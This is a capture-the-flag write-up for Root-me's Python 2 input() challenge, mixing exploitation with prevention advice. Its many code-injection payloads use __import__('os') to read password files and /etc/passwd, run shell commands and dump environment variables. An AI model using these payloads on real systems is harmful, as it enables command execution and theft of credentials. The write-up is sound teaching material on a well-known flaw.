# Python - input()

**Category:** App-Script  
**Difficulty:** ⭐⭐ (Medium)  
**Points:** 15  
**Platform:** [Root-me](https://www.root-me.org/)

---

## 📋 Challenge Description

This challenge exploits a dangerous vulnerability in Python 2's `input()` function. Unlike Python 3, Python 2's `input()` evaluates the input as Python code, which can lead to arbitrary code execution.

The challenge demonstrates why using `input()` in Python 2 is a critical security vulnerability and why it was changed in Python 3.

---

## 🎯 Objective

Exploit the Python 2 `input()` function vulnerability to execute arbitrary code and retrieve the flag.

---

## 🔍 Background: Python 2 vs Python 3 input()

### Python 2 (Vulnerable)

In Python 2, there are two input functions:

```python
# raw_input() - Safe: Returns string as-is
name = raw_input("Enter your name: ")

# input() - DANGEROUS: Evaluates input as Python code
age = input("Enter your age: ")  # If you enter: 5+5, it evaluates to 10
```

### Python 3 (Safe)

Python 3 removed the dangerous `input()` behavior:

```python
# input() in Python 3 is equivalent to raw_input() in Python 2
name = input("Enter your name: ")  # Always returns a string
```

---

## 🔍 Approach

### 1. Analyze the Application

Connect to the challenge and observe the application behavior:

```bash
ssh -p [port] app-script-ch1@challenge03.root-me.org
```

The application likely looks like this:

```python
#!/usr/bin/env python2
# Vulnerable code example

password = "secret_password_here"
user_input = input("Enter password: ")

if user_input == password:
    print("Access granted!")
else:
    print("Access denied!")
```

### 2. Identify the Vulnerability

The `input()` function in Python 2:
- Evaluates the input as a Python expression
- Allows arbitrary code execution
- Can be exploited to bypass authentication or execute commands

### 3. Exploitation Strategy

Since `input()` evaluates code, we can:
- Access variables in the current scope
- Call built-in functions
- Execute system commands
- Read files

---

## 💡 Solution

### Method 1: Variable Access

Since `input()` evaluates in the same scope, we can directly access the password variable:

```python
# When prompted for input, enter:
password

# This evaluates to the value of the 'password' variable
# No quotes needed!
```

**Explanation:** The input is evaluated as Python code, so entering `password` accesses the variable directly.

### Method 2: File Reading

Read the password file directly:

```python
# Enter this at the input prompt:
open('/challenge/app-script/ch1/.passwd').read()

# Or:
__import__('os').popen('cat /challenge/app-script/ch1/.passwd').read()
```

### Method 3: Shell Command Execution

Execute system commands:

```python
# Using os.system
__import__('os').system('cat /challenge/app-script/ch1/.passwd')

# Using subprocess
__import__('subprocess').check_output(['cat', '/challenge/app-script/ch1/.passwd'])
```

### Method 4: List Directory Contents

Explore the file system:

```python
# List files in current directory
__import__('os').listdir('.')

# Find the password file
__import__('os').popen('find /challenge -name ".passwd"').read()
```

---

## 🎯 Exploitation Examples

### Example 1: Direct Variable Access

```python
# Application code:
secret = "flag{secret_value}"
user_input = input("Enter secret: ")

# Exploit:
Enter secret: secret
# Returns: flag{secret_value}
```

### Example 2: Bypass Authentication

```python
# Application code:
password = "secure123"
if input("Password: ") == password:
    print("Access granted")

# Exploit:
Password: password
# Evaluates: password == password → True
# Result: Access granted
```

### Example 3: Code Injection

```python
# Exploit with complex expression:
__import__('os').popen('whoami').read()

# Or chain commands:
__import__('os').system('cat flag.txt && ls -la')
```

---

## 🧠 Key Concepts

### The Danger of eval() and input()

Both `eval()` and Python 2's `input()` execute arbitrary code:

```python
# Python 2 input() is essentially:
def input(prompt):
    return eval(raw_input(prompt))
```

This is extremely dangerous because:
1. Users can execute any Python code
2. Can access variables in scope
3. Can import and use any module
4. Can execute system commands

### Secure Alternatives

**Python 2:**
```python
# Use raw_input() instead
user_input = raw_input("Enter value: ")
```

**Python 3:**
```python
# input() is safe in Python 3
user_input = input("Enter value: ")

# Still avoid eval() with user input
# Bad:
result = eval(user_input)

# Good:
try:
    result = int(user_input)  # Convert explicitly
except ValueError:
    print("Invalid input")
```

---

## 🔧 Exploitation Techniques

### 1. Variable Inspection

```python
# List local variables
locals()

# List global variables
globals()

# Access specific variable
password

# Get all variables
dir()
```

### 2. Module Importing

```python
# Import modules
__import__('os')
__import__('sys')
__import__('subprocess')

# Use imported modules
__import__('os').getcwd()
__import__('os').listdir('.')
```

### 3. File Operations

```python
# Read files
open('filename.txt').read()
open('/etc/passwd').readlines()

# Write files (if permissions allow)
open('/tmp/test.txt', 'w').write('content')
```

### 4. Command Execution

```python
# Using os.system
__import__('os').system('command')

# Using os.popen
__import__('os').popen('command').read()

# Using subprocess
__import__('subprocess').check_output(['ls', '-la'])
```

### 5. Environment Variables

```python
# Access environment variables
__import__('os').environ

# Specific variable
__import__('os').environ.get('PATH')
```

---

## 📚 Lessons Learned

### Security Implications

1. **Never Use Python 2 input() with User Data**
   - Always use `raw_input()` in Python 2
   - Migrate to Python 3 where `input()` is safe

2. **Avoid eval() with User Input**
   - `eval()` is just as dangerous
   - Validate and sanitize all user input
   - Use safer alternatives like `ast.literal_eval()` for data structures

3. **Input Validation is Critical**
   - Always validate user input
   - Use type conversion instead of evaluation
   - Implement whitelisting, not blacklisting

### Best Practices

```python
# Bad - Don't do this:
age = input("Enter age: ")  # Python 2
score = eval(user_input)     # Any Python version

# Good - Do this instead:
age = raw_input("Enter age: ")  # Python 2
try:
    age = int(age)
except ValueError:
    print("Invalid age")

# For Python 3:
age = input("Enter age: ")
try:
    age = int(age)
except ValueError:
    print("Invalid age")

# For safe evaluation of literals only:
import ast
data = ast.literal_eval(user_input)  # Only evaluates literals
```

---

## 🔗 References

- [Python 2 Documentation - input()](https://docs.python.org/2/library/functions.html#input)
- [Python 3 Documentation - input()](https://docs.python.org/3/library/functions.html#input)
- [OWASP - Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [PEP 3111 - Simple input built-in in Python 3000](https://www.python.org/dev/peps/pep-3111/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)

---

## 🎓 Difficulty Assessment

**Skill Level Required:** Intermediate  
**Time to Complete:** 10-20 minutes  
**Prerequisites:**
- Basic Python knowledge
- Understanding of Python 2 vs Python 3 differences
- Familiarity with eval() and input() functions
- Basic file system operations

---

## 📝 Prevention Checklist

To prevent input() vulnerabilities:

- [ ] Migrate from Python 2 to Python 3
- [ ] Replace Python 2 `input()` with `raw_input()`
- [ ] Never use `eval()` with user input
- [ ] Use `ast.literal_eval()` for safe literal evaluation
- [ ] Implement input validation and type conversion
- [ ] Use prepared statements for database queries
- [ ] Sanitize all user input
- [ ] Follow principle of least privilege

---

## 🧪 Testing for the Vulnerability

### Detection

```bash
# Check Python version
python --version

# If Python 2, check for input() usage
grep -r "input(" *.py

# Test with simple payload
# If prompted for input, try:
1+1

# If it returns 2 instead of "1+1", it's vulnerable
```

### Proof of Concept

Create a test script:

```python
#!/usr/bin/env python2
# test_input.py

secret = "SECRET_VALUE"
print("Test Application")
user_input = input("Enter something: ")
print("You entered:", user_input)

# Run it and input: secret
# If it prints the value of 'secret' variable, it's vulnerable
```

---

## ✅ Validation

Once you've exploited the vulnerability and retrieved the password:

1. Note the password from the flag file
2. Submit it through Root-me platform
3. Understand why the vulnerability exists
4. Know how to prevent it in your own code

**Challenge Status:** ✅ Completed  
**Date Completed:** [Your completion date]  
**Points Earned:** 15

---

## 💡 Pro Tips

1. **Always check Python version** in challenges
2. **Try simple expressions first** (like `1+1`) to confirm evaluation
3. **Use `__import__()` for modules** instead of normal import syntax
4. **Remember variable names** are likely obvious (`password`, `secret`, `flag`)
5. **Explore the environment** using `dir()`, `locals()`, `globals()`

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing systems.*
